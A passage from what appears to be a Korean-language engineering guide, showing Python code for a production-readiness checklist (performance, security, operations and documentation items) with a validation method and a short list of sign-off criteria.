                'Response time < 1s (p95)',
                'Can handle 1000+ RPS',
                'Memory usage < 2GB',
                'CPU usage < 80%'
            ]
        },
        # 보안 요구사항
        {
            'category': 'security',
            'items': [
                'Input validation implemented',
                'Rate limiting configured',
                'Authentication/Authorization working',
                'Secrets properly managed'
            ]
        },
        # 운영 요구사항
        {
            'category': 'operations',
            'items': [
                'Logging configured',
                'Monitoring dashboards created',
                'Alerts configured',
                'Backup/Recovery tested'
            ]
        },
        # 문서화
        {
            'category': 'documentation',
            'items': [
                'API documentation complete',
                'Deployment guide written',
                'Troubleshooting guide available',
                'Architecture documented'
            ]
        }
    ]

    def validate_checklist(self) -> Dict[str, Any]:
        """체크리스트 검증"""

        results = {}

        for category in self.CHECKLIST_ITEMS:
            category_results = []

            for item in category['items']:
                # 각 항목 검증
                passed = self._validate_item(category['category'], item)
                category_results.append({
                    'item': item,
                    'passed': passed
                })

            results[category['category']] = {
                'total': len(category['items']),
                'passed': sum(1 for r in category_results if r['passed']),
                'items': category_results
            }

        overall_passed = all(
            results[cat]['passed'] == results[cat]['total']
            for cat in results
        )

        return {
            'overall_passed': overall_passed,
            'categories': results,
            'timestamp': datetime.utcnow().isoformat()
        }
```

**검증 기준**:

- [ ] 모든 테스트 통과
- [ ] 성능 기준 충족
- [ ] 보안 요구사항 만족
- [ ] 운영 준비 완료

---
